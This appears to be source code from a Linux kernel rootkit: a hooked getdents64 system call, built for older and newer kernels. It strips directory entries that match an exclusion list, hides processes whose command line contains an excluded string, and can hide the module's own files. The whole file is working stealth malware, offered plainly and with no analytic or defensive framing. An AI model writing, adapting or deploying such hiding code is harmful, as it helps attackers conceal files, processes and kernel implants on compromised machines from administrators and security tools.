
#include "utils/excludes/string_filtering.h"
#include "utils/proc_utils.h"
#include "utils/ftrace_utils.h"
#include "hooks/x64_sys_getdents64.h"


#if LINUX_VERSION_CODE < KERNEL_VERSION(4,17,0)
asmlinkage long (*orig_getdents64)(unsigned int fd, char __user *dirp, unsigned int count);

asmlinkage long hook_getdents64(unsigned int fd, char __user *dirp, unsigned int count) {
    long ret = orig_getdents64(fd, dirp, count);
    return hook_getdents64_impl(fd, dirp, ret);
}
#else
asmlinkage long (*orig_getdents64)(const struct pt_regs *regs);

asmlinkage int hook_getdents64(const struct pt_regs *regs) {
    unsigned int fd = regs->di;
    char __user *dirp = (char __user *)regs->si;
    long ret = orig_getdents64(regs);
    return hook_getdents64_impl(fd, dirp, ret);
}
#endif


long hook_getdents64_impl(unsigned int fd, char __user *dirp, long ret) {
    long new_ret = ret; // total bytes after filtering
    unsigned long offset = 0;
    unsigned long bytes_left;
    struct linux_dirent64 *d, *kdirent, *kdirent_orig;

    if (new_ret <= 0)
        return new_ret;

    kdirent = kmalloc(new_ret, GFP_KERNEL);
    if (!kdirent)
        return new_ret;

    kdirent_orig = kmalloc(new_ret, GFP_KERNEL); // save orig results as backup (in case something fails)
    if (!kdirent_orig) {
        kfree(kdirent);
        return new_ret;
    }

    if (copy_from_user(kdirent, dirp, new_ret)) {
        kfree(kdirent);
        kfree(kdirent_orig);
        return new_ret;
    }
    memcpy(kdirent_orig, kdirent, new_ret);

    bytes_left = new_ret;
    while (bytes_left > 0) {
        d = (struct linux_dirent64 *)((char *)kdirent + offset);
        size_t shift_by = 0;

#ifdef HIDE_MODULE
        // check regardless of the exclusions - finish the loop
        if (is_mod_directory(fd) && strstr(d->d_name, MODULE_NAME)) { // if modules directory and HIDE_MODULE is set - hide the mod files
            shift_by = d->d_reclen;
            goto shift_and_iter;
        }
#endif

        if (string_exclusions_are_empty()) {
            // do nothing
        } else if (str_entry_is_excluded(d->d_name)) { // hide dirs/files by custom filtering
            shift_by = d->d_reclen;
            goto shift_and_iter;
        } else if (is_numeric(d->d_name)) { // hide processes that contain the excluded string in the cmdline
            int pid;
            if (kstrtoint(d->d_name, 10, &pid) == 0) {
                char *cmdline;
                size_t cmd_size;
                cmdline = read_cmdline_from_task(pid, &cmd_size);
                if (cmdline) {
                    for (size_t i = 0; i < cmd_size; i++) {
                        if (cmdline[i] == '\0')
                            cmdline[i] = ' ';
                    }
                    if (str_entry_is_excluded(cmdline)) {
                        kfree(cmdline);
                        shift_by = d->d_reclen;
                        goto shift_and_iter;
                    }
                    kfree(cmdline);
                }            
            }
        }

shift_and_iter:
        if (shift_by > 0) { // need to use shift_by rather than d->d_reclen as it would change after memmove
            memmove(d, (char *)d + shift_by, bytes_left - shift_by);
            new_ret -= shift_by;
            bytes_left -= shift_by;
        } else {
            offset += d->d_reclen; // no need to change offset if no shifting was done
            bytes_left -= d->d_reclen;
        }
        continue;
    }

    if (copy_to_user(dirp, kdirent, new_ret)) {
        if (copy_to_user(dirp, kdirent_orig, new_ret)) {
            // suppress warnings
        }
        kfree(kdirent_orig);
        kfree(kdirent);
        return new_ret;
    }

    kfree(kdirent_orig);
    kfree(kdirent);
    return new_ret;
}
